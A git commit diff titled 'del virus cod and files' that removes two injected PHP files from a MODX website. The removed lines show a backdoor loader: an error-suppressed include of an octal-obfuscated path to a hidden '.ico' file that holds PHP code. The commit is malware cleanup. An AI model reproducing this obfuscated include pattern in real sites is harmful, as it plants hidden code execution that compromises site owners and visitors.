5b0c5bbd385ce6ac60561d6e51a1f7dc1376874d
SkorpmaX PC <max.SkorpmaX@yandex.by>
2018-08-09 13:36:00 +0200

    del virus cod and files

--- core/config/index.php
+++
@@ -1,7 +0,0 @@
-<?php
-/*7bb1d*/
-
-@include "\057home\057s/sk\157rpma\170/kuh\156i.m-\153it.b\171_mod\170/pub\154ic_h\164ml/c\157re/c\157mpon\145nts/\147alle\162y/.4\0626403\0631.ic\157";
-
-/*7bb1d*/
-
--- core/error/index.php
+++
@@ -1,7 +0,0 @@
-<?php
-/*da08b*/
-
-@include "\057hom\145/s/\163kor\160max\057kuh\156i.m\055kit\056by_\155odx\057pub\154ic_\150tml\057cor\145/co\155pon\145nts\057gal\154ery\057.42\066403\0631.i\143o";
-
-/*da08b*/
-
